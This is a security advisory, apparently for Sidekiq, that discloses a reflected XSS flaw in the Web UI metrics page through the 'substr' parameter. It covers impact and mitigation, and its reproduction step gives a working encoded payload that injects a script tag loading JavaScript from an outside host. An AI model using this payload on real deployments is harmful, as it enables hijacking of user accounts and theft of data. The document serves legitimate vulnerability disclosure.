summary: "Sidekiq vulnerable to a Reflected XSS in Queues Web Page\n### Description:\nDuring\
  \ the source Code Review of the metrics.erb view of the Sidekiq Web UI, A reflected XSS vulnerability\
  \ is discovered. The value of substr parameter is reflected in the response without any encoding,\
  \ allowing an attacker to inject Javascript code into the response of the application. \n\n\
  This vulnerability can be exploited to target the users of the application, and users of other\
  \ applications deployed on the same domain or website as that of the Sidekiq website. Successful\
  \ exploit results may result in compromise of user accounts and user data.\n\n### Impact:\n\
  The impact of this vulnerability can be severe. An attacker could exploit it to target users\
  \ of the Sidekiq Web UI. Moreover, if other applications are deployed on the same domain or\
  \ website as Sidekiq, users of those applications could also be affected, leading to a broader\
  \ scope of compromise. Potentially compromising their accounts, forcing the users to perform\
  \ sensitive actions, stealing sensitive data, performing CORS attacks, defacement of the web\
  \ application, etc.\n\n### Mitigation:\nEncode all output data before rendering it in the\
  \ response to prevent XSS attacks.\n\n### Steps to Reproduce:\n1. Go to the following URL\
  \ of the sidekiq Web UI: \nhttps://{host}/sidekiq/metrics?substr=beret%22%3E%3Cscript%20src=%22https://cheemahq.vercel.app/a.js%22%20/%3E\n\
  2. XSS payload will be executed, causing a popup.\n\n### Evidence:\n\n![image](https://github.com/sidekiq/sidekiq/assets/59286712/9b7efa06-60bc-4d72-bb37-c5949154827e)\n\
